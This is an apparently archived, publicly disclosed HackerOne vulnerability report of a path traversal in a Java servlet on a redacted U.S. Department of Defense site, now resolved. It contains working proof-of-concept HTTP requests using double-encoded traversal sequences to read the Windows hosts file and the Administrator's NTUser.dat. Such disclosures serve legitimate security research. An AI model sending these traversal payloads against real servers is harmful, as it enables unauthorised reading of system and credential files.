---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/java
  - vuln/path-traversal
  - vuln/misconfiguration
  - impact/rce
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2019-10-04
submitted: 2019-02-19T01:01:16.591Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "sp1d3rs"
source: "https://hackerone.com/reports/497771"
title: "[Critical] Full local fylesystem access (LFI/LFD) as admin via Path Traversal in the misconfigured Java servlet on the https://███/"
---
# [Critical] Full local fylesystem access (LFI/LFD) as admin via Path Traversal in the misconfigured Java servlet on the https://███/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-04

- Report: [https://hackerone.com/reports/497771](https://hackerone.com/reports/497771)
- CWE: Path Traversal
- Submitted: 2019-02-19T01:01:16.591Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

##Description
Hello. I discovered a Path Traversal issue on the https://██████████/
I was able to turn it to the local file read, and after series of the test determined that it's possible to reach sensitive system files with administrator rights.

##POC
The next request will read the `c:/windows/System32/drivers/etc/hosts` as POC:
```
GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts HTTP/1.1
Host: ██████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```
██████████
In browser (Chrome):
```
https://███████/gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/System32/drivers/etc/hosts
```

Testing if we have admin rights:
```
GET /gwtmain//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fUsers/Administrator/NTUser.dat HTTP/1.1
Host: ████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

```
The system will return 200 ok and respond with content of `Users/Administrator/NTUser.dat` which should be accessible only from administrator account.
██████
It proves the critical impact an possibility of the RCE, because we have high-privileged rights on the system.

##Suggested fix
Secure the vulnerable servlet.

## Impact

Remote attacker is able to read any file on the system partition, it can lead to the full compromise of the resource, in case attacker will reach sensitive files such as logs/credentials/registry tree.

## Timeline

- **Report Filed**
- **2019-02-19** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-02-19** @sp1d3rs: The vulnerable servlet is seems to be `GwtCssServlet` (used to serve static css files), but I'm not 100% sure.

P.S. IP used for tests (for tracking purposes): `██████████`
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **2019-07-11** @sp1d3rs: If this will pass disclosure procedure, please hide my IP address from the report:) just in case.
- **2019-07-11** @ag3nt-j1: So first thing you want us to do is send your IP out on twitter? :P 

Then disclose?
- **2019-07-11** @sp1d3rs: {F527051}
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
